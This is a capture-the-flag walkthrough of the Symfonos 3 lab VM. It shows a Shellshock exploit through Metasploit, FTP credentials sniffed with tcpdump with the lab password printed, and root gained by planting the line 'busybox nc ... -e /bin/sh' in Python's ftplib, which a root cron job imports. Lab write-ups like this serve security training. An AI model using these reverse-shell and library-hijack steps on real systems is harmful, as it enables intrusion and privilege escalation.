# Symfonos 3 Writeup
Let's start with a network scan
```bash
Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                
                                                                                                                                                                                                              
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                              
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                             
 192.168.0.118   00:0c:29:26:12:da      1      60  VMware, Inc.                                                                                                                                               

```
\
Next Open Ports
```bash
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```
\
So accessing port 80 , shows just a random picture , and rand dirb on it
```bash
dirb http://192.168.0.118/                       

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jan 24 13:26:29 2026
URL_BASE: http://192.168.0.118/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.118/ ----
+ http://192.168.0.118/cgi-bin/ (CODE:403|SIZE:278)                                                                                                                                                           
==> DIRECTORY: http://192.168.0.118/gate/                                                                                                                                                                     
+ http://192.168.0.118/index.html (CODE:200|SIZE:241)                                                                                                                                                         
+ http://192.168.0.118/server-status (CODE:403|SIZE:278)                                                                                                                                                      
                                                                                                                                                                                                              
---- Entering directory: http://192.168.0.118/gate/ ----
+ http://192.168.0.118/gate/index.html (CODE:200|SIZE:202)                                                                                                                                                    
                                                                                                                                                                                                              
-----------------
END_TIME: Sat Jan 24 13:26:35 2026
DOWNLOADED: 9224 - FOUND: 4

```
\
Then ran ffuf which gave me a lead to "cerberus" , then ran ffuf again got "tartarus" and then rand dirb again
```bash
dirb http://192.168.0.118/gate/cerberus/tartarus/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jan 24 13:22:45 2026
URL_BASE: http://192.168.0.118/gate/cerberus/tartarus/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.118/gate/cerberus/tartarus/ ----
+ http://192.168.0.118/gate/cerberus/tartarus/index.html (CODE:200|SIZE:273)                                                                                                                                  
+ http://192.168.0.118/gate/cerberus/tartarus/research (CODE:200|SIZE:6825)                                                                                                                                   
                                                                                                                                                                                                              
-----------------
END_TIME: Sat Jan 24 13:22:48 2026
DOWNLOADED: 4612 - FOUND: 2
```
\
This time it was not a directory but a file which was just some text
\
<img width="1646" height="744" alt="image" src="https://github.com/user-attachments/assets/4e349a34-bc9e-46f5-9d82-49a485eca245" />
\
So i give up this method and check ftp 
```bash
ftp 192.168.0.118                                                                                                                                     
Connected to 192.168.0.118.
220 ProFTPD 1.3.5b Server (Debian) [::ffff:192.168.0.118]
Name (192.168.0.118:kali): anonymous
331 Password required for anonymous
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```
\
I remember this version being vulnerable to code exec or lfi , so i checked 
```bash
 nc 192.168.0.118 21 -vvv
192.168.0.118: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.0.118] 21 (ftp) open
220 ProFTPD 1.3.5b Server (Debian) [::ffff:192.168.0.118]
site help
214-The following SITE commands are recognized (* =>'s unimplemented)
214-CPFR <sp> pathname
214-CPTO <sp> pathname
214-UTIME <sp> YYYYMMDDhhmm[ss] <sp> path
214-SYMLINK <sp> source <sp> destination
214-RMDIR <sp> path
214-MKDIR <sp> path
214-The following SITE extensions are recognized:
214-RATIO -- show all ratios in effect
214-QUOTA
214-HELP
214-CHGRP
214-CHMOD
214 Direct comments to root@symfonos3
site cpfr /etc/passwd
530 Please login with USER and PASS
```
\
This method also didnt work , it asked for authentication
\
So after a lot of time waste , i checked online for hints , and from the first dirb scan i.e root of the webpage about cgi-bin
\
So i run ffuf on it
```bash
ffuf -u http://192.168.0.118/cgi-bin/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.118/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# directory-list-2.3-medium.txt [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2ms]
# Copyright 2007 James Fisher [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3ms]
#                       [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3ms]
# This work is licensed under the Creative Commons [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3ms]
#                       [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 128ms]
                        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 133ms]
# Priority ordered case-sensitive list, where entries were found [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 135ms]
# on at least 2 different hosts [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 275ms]
#                       [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 290ms]
#                       [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 299ms]
                        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3ms]
underworld              [Status: 200, Size: 63, Words: 14, Lines: 2, Duration: 460ms]
```
\
We go to /underworld  which had some uptime or something
\
<img width="699" height="185" alt="image" src="https://github.com/user-attachments/assets/6b84f8e7-fc9b-42d4-9ffb-ee0a7043f986" />
\
Then searched about cgi-bin from which i understood that any request goes through cgi-bin scripts first , and there is a code exec vulnerability "shellshock"
\
And to test it , we use this poc from 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html'
```bash
nmap 192.168.0.118 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/underworld
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-24 13:19 EST
Nmap scan report for 192.168.0.118
Host is up (0.00074s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
MAC Address: 00:0C:29:26:12:DA (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```
\
So it indeed is vulnerable to shellshock , now we can try code exec for a reverse shell
\
Next , I used metasploit to get a shell ( Manual method is also easy , just curl with shellshock cmd injection poc in user-agent header )
```bash
msf > search shellshock cgi

Matching Modules
================

   #  Name                                               Disclosure Date  Rank       Check  Description
   -  ----                                               ---------------  ----       -----  -----------
   0  exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   1  exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   2    \_ target: Linux x86                             .                .          .      .
   3    \_ target: Linux x86_64                          .                .          .      .
   4  auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner


Interact with a module by name or index. For example info 4, use 4 or use auxiliary/scanner/http/apache_mod_cgi_bash_env

msf > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CMD_MAX_LENGTH  2048             yes       CMD max line length
   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent       yes       HTTP header to use
   METHOD          GET              yes       HTTP method to use
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
   RPORT           80               yes       The target port (TCP)
   SSL             false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI                        yes       Path to CGI script
   TIMEOUT         5                yes       HTTP read response timeout (seconds)
   URIPATH                          no        The URI to use for this exploit (default is random)
   VHOST                            no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.105    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86



View the full module info with the info, or info -d command.

msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhosts 192.168.0.118
rhosts => 192.168.0.118
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set SRVPORT 8081
SRVPORT => 8081
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/underworld
targeturi => /cgi-bin/underworld
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > check
[+] 192.168.0.118:80 - The target is vulnerable.
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
[*] Started reverse TCP handler on 192.168.0.105:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1062760 bytes) to 192.168.0.118
[*] Meterpreter session 1 opened (192.168.0.105:4444 -> 192.168.0.118:42356) at 2026-01-24 13:34:10 -0500
shell

meterpreter > shell
Process 1730 created.
Channel 1 created.
shell
/bin/sh: 1: shell: not found
id
uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)
```
\
Next , i check about the users with bash 
```bash
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
hades:x:1000:1000:,,,:/home/hades:/bin/bash
cerberus:x:1001:1001:,,,:/home/cerberus:/bin/bash
```
\
And i look around the file system for any owned important files, then i check for files of user hades
```bash
find / -type f -user hades -exec ls -l {} + 2>/dev/null
-rw-r--r-- 1 hades hades  220 Jul 19  2019 /home/hades/.bash_logout
-rw-r--r-- 1 hades hades 3526 Jul 19  2019 /home/hades/.bashrc
-rw-r--r-- 1 hades hades  675 Jul 19  2019 /home/hades/.profile
-rw-r--r-- 1 hades hades  165 Apr  6  2020 /home/hades/.wget-hsts
-rw-r--r-- 1 hades hades  251 Jul 20  2019 /srv/ftp/statuscheck.txt
```
\
I thought it was useful but it wasnt , Then i check capabilities
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
\
I tried to leverage it , but wasnt quite useful , So i turned to pspy
\
AFter runiing it for a bit , i notice some interesting things
```bash
2026/01/24 13:08:01 CMD: UID=0     PID=24213  | /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 > /opt/ftpclient/statuscheck.txt 
2026/01/24 13:08:01 CMD: UID=0     PID=24214  | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
2026/01/24 13:08:01 CMD: UID=1000  PID=24215  | proftpd: (accepting connections)               
```
\
We see "/opt/ftpclient/ftpclient.py" script being run , but we cant read it since it is owned by user hades
\
And we also see something like accepting  a FTP connection , so i thought lets try to cath the authentication packet using tcpdump
```bash
tcpdump -i lo -w dump.pcap
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes


^C235 packets captured
470 packets received by filter
0 packets dropped by kernel
```
\
So i left it on for some time and then sent the recorded pcap file to attacker machien to open using wireshark
\
<img width="1633" height="346" alt="image" src="https://github.com/user-attachments/assets/ddd58a24-add6-4199-addd-39a26b5275d1" />
\
Here we can see some ftp packets, so lets follow it
\
<img width="659" height="356" alt="image" src="https://github.com/user-attachments/assets/f8b4320c-f537-41a1-8ed3-4ae1f95e8b48" />
\
Hence we got password of user hades
\
After switching to user hades , now we have access to read the file "/opt/ftpclient/ftpclient.py"
```bash
cat ftpclient.py 
import ftplib

ftp = ftplib.FTP('127.0.0.1')
ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')

ftp.cwd('/srv/ftp/')

def upload():
    filename = '/opt/client/statuscheck.txt'
    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
    ftp.quit()

upload()
```
\
And since this runs in a cron job as root , we try to modify this file
```bash
-rw-r--r-- 1 root hades  262 Apr  6  2020 ftpclient.py
```
\
But it is un-writeable , so we move on to the next option of modifying, since the script imports "ftplib" , we modify it and execute arbitary commands as root
\
So i find where the actual file is
```bash
find / -type f -name "ftplib*" 2>/dev/null
/usr/lib/python2.7/ftplib.pyc
/usr/lib/python2.7/ftplib.py
/usr/lib/python3.5/__pycache__/ftplib.cpython-35.pyc
/usr/lib/python3.5/ftplib.py
```
\
And since the cron used python2.7 , our file is "/usr/lib/python2.7/ftplib.py" , we are going to edit it
\
<img width="1251" height="659" alt="image" src="https://github.com/user-attachments/assets/12be476f-b280-4d81-98d9-a14ae524c627" />
\
So i added this line "os.system('busybox nc 192.168.0.105 4445 -e /bin/sh')"
\
<img width="813" height="621" alt="image" src="https://github.com/user-attachments/assets/9a71a023-8da3-40aa-babe-646e06c91fe7" />
\
and now we just wait for the cronjob to run
```bash
penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.0.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from symfonos3~192.168.0.118-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/symfonos3~192.168.0.118-Linux-x86_64/2026_01_24-14_52_01-568.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@symfonos3:~# id
uid=0(root) gid=0(root) groups=0(root)
root@symfonos3:~# cd ~
root@symfonos3:~# ls -la
total 28
drwx------  4 root root 4096 Apr  6  2020 .
drwxr-xr-x 22 root root 4096 Jul 19  2019 ..
lrwxrwxrwx  1 root root    9 Jul 20  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  2 root root 4096 Jul 20  2019 .cache
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root 1279 Jul 20  2019 proof.txt
drwxr-xr-x  2 root root 4096 Apr  6  2020 .ssh
root@symfonos3:~# cat proof.txt 

        Congrats on rooting symfonos:3!
                                        _._
                                      _/,__\,
                                   __/ _/o'o
                                 /  '-.___'/  __
                                /__   /\  )__/_))\
     /_/,   __,____             // '-.____|--'  \\
    e,e / //  /___/|           |/     \/\        \\
    'o /))) : \___\|          /   ,    \/         \\
     -'  \\__,_/|             \/ /      \          \\
             \_\|              \/        \          \\
             | ||              <    '_    \          \\
             | ||             /    ,| /   /           \\
             | ||             |   / |    /\            \\
             | ||              \_/  |   | |             \\
             | ||_______________,'  |__/  \              \\
              \|/_______________\___/______\_             \\
               \________________________     \__           \\        ___
                  \________________________    _\_____      \\ _____/
                     \________________________               \\
        ~~~~~~~        /  ~~~~~~~~~~~~~~~~~~~~~~~~~~~  ~~ ~~~~\\~~~~
            ~~~~~~~~~~~~~~    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~    //

        Contact me via Twitter @zayotic to give feedback!
```
\
And we finally get root
\
The End , thank you for reading till here
